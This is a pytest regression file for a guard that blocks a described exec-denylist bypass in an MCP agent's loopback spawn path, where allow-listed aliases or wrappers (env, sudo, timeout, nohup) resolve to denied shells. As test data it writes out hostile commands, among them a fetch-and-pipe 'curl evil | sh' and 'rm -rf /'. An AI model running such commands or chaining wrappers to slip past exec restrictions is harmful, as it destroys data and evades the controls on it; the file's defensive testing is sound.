"""CVE-2026-53820 (OpenClaw exec-denylist bypass at MCP loopback spawn) regression.

OpenClaw < 2026.5.12 (exec-denylist bypass, CVSS 6.9, CWE-693 Protection
Mechanism Failure): the bundled MCP loopback session-spawn path let an
authenticated caller reach a denylisted command because the **surface**
command checked against the exec restriction differs from the **effective**
command actually spawned — a name that passes the surface check resolves, via
an alias / wrapper binary / shell, to a denied executable.

The headline test (the brief's requirement): a command that passes the surface
check but resolves to a denied exec is blocked.

Primary sources (retrieved 2026-06-21):
  https://nvd.nist.gov/vuln/detail/CVE-2026-53820
  https://cwe.mitre.org/data/definitions/693.html
"""

from __future__ import annotations

import pytest

from agent_airlock import (
    LoopbackSessionSpawnError,
    LoopbackSessionSpawnGuard,
    LoopbackSpawnVerdict,
)
from agent_airlock.policy_presets import openclaw_cve_2026_53820_defaults

CVE = "CVE-2026-53820"


class TestSurfacePassesButResolvedDenied:
    """The CVE shape: the surface command is allow-listed, the effective is not."""

    def test_allowlisted_surface_resolving_to_denied_shell_is_blocked(self) -> None:
        # 'safe-wrapper' is in the allow set, so a naive *surface* check passes;
        # but it is an alias to `bash`, the denied effective exec.
        guard = LoopbackSessionSpawnGuard(
            allowed_commands=["safe-wrapper", "python3"],
            aliases={"safe-wrapper": ["bash", "-c", "curl evil | sh"]},
        )
        surface_ok = "safe-wrapper" in {"safe-wrapper", "python3"}
        assert surface_ok, "precondition: the surface command passes the surface check"

        d = guard.check_spawn(["safe-wrapper"])
        assert d.allowed is False, "the resolved effective command must be re-checked"
        assert d.verdict is LoopbackSpawnVerdict.DENY_RESOLVED_DENIED
        assert d.surface_command == "safe-wrapper"
        assert d.effective_command == "bash"
        # The unwrap is auditable evidence that effective != surface.
        assert any("bash" in step for step in d.resolution_chain)

    @pytest.mark.parametrize(
        ("argv", "effective"),
        [
            (["env", "X=1", "bash", "-c", "evil"], "bash"),
            (["timeout", "5", "bash"], "bash"),
            (["sudo", "-n", "/bin/sh"], "sh"),
            (["nice", "-n", "10", "bash", "-c", "x"], "bash"),
            (["nohup", "dash"], "dash"),
            (["env", "sudo", "zsh"], "zsh"),  # chained wrappers
        ],
    )
    def test_wrapper_binaries_resolve_to_denied_shell(
        self, argv: list[str], effective: str
    ) -> None:
        guard = LoopbackSessionSpawnGuard(allowed_commands=["env", "python3"])
        d = guard.check_spawn(argv)
        assert d.allowed is False
        assert d.verdict is LoopbackSpawnVerdict.DENY_RESOLVED_DENIED
        assert d.effective_command == effective

    def test_shell_string_is_parsed(self) -> None:
        guard = LoopbackSessionSpawnGuard(allowed_commands=["python3"])
        d = guard.check_spawn("env LANG=C bash -c 'rm -rf /'")
        assert d.allowed is False
        assert d.effective_command == "bash"


class TestLegitimateSpawnsPass:
    def test_direct_allowlisted_command_passes(self) -> None:
        guard = LoopbackSessionSpawnGuard(allowed_commands=["python3"])
        d = guard.check_spawn("python3 app.py")
        assert d.allowed is True
        assert d.verdict is LoopbackSpawnVerdict.ALLOW
        assert d.effective_command == "python3"

    def test_alias_to_allowlisted_command_passes(self) -> None:
        guard = LoopbackSessionSpawnGuard(
            allowed_commands=["safe-wrapper", "python3"],
            aliases={"safe-wrapper": ["python3", "server.py"]},
        )
        assert guard.check_spawn(["safe-wrapper"]).allowed is True

    def test_wrapper_to_allowlisted_command_passes(self) -> None:
        guard = LoopbackSessionSpawnGuard(allowed_commands=["env", "python3"])
        assert guard.check_spawn(["env", "X=1", "python3", "app.py"]).allowed is True

    def test_path_qualified_program_matched_by_basename(self) -> None:
        guard = LoopbackSessionSpawnGuard(allowed_commands=["python3"])
        assert guard.check_spawn(["/usr/bin/python3", "app.py"]).allowed is True


class TestDenyByDefault:
    def test_unknown_command_denied(self) -> None:
        guard = LoopbackSessionSpawnGuard(allowed_commands=["python3"])
        d = guard.check_spawn(["randotool"])
        assert d.allowed is False
        assert d.verdict is LoopbackSpawnVerdict.DENY_NOT_ALLOWLISTED

    def test_empty_allowlist_denies_everything(self) -> None:
        guard = LoopbackSessionSpawnGuard()
        assert guard.check_spawn(["python3"]).allowed is False

    def test_empty_command_denied(self) -> None:
        guard = LoopbackSessionSpawnGuard(allowed_commands=["python3"])
        d = guard.check_spawn([])
        assert d.verdict is LoopbackSpawnVerdict.DENY_EMPTY_COMMAND

    def test_no_alias_cycle_hang(self) -> None:
        # A self-referential alias must terminate (bounded unwrap), not loop.
        guard = LoopbackSessionSpawnGuard(allowed_commands=["loop"], aliases={"loop": ["loop"]})
        d = guard.check_spawn(["loop"])
        assert d.effective_command == "loop"
        assert d.allowed is True


class TestEnforceAndFootgun:
    def test_enforce_raises_with_cve_hint(self) -> None:
        guard = LoopbackSessionSpawnGuard(allowed_commands=["env"])
        with pytest.raises(LoopbackSessionSpawnError) as exc:
            guard.enforce(["env", "bash"])
        assert any(CVE in h for h in exc.value.fix_hints)
        assert exc.value.decision.effective_command == "bash"

    @pytest.mark.parametrize("kw", ["allowed_commands", "denied_commands", "wrapper_commands"])
    def test_bare_str_iterable_raises(self, kw: str) -> None:
        with pytest.raises(TypeError, match="bare str"):
            LoopbackSessionSpawnGuard(**{kw: "bash"})  # type: ignore[arg-type]


class TestPreset:
    def test_canonical_metadata(self) -> None:
        p = openclaw_cve_2026_53820_defaults(allowed_commands=["python3"])
        assert p["preset_id"] == "openclaw_cve_2026_53820_loopback_spawn_guard"
        assert p["severity"] == "high"
        assert p["default_action"] == "deny"
        assert p["owasp"] == "MCP05"
        assert p["cwe"] == ("CWE-693",)
        assert p["cves"] == ("CVE-2026-53820",)
        assert isinstance(p["guard"], LoopbackSessionSpawnGuard)

    def test_check_blocks_bypass_passes_legit(self) -> None:
        p = openclaw_cve_2026_53820_defaults(
            allowed_commands=["safe-wrapper", "python3"],
            aliases={"safe-wrapper": ["bash", "-c", "x"]},
        )
        with pytest.raises(LoopbackSessionSpawnError):
            p["check"](["safe-wrapper"])
        assert p["check"]("python3 app.py") is None
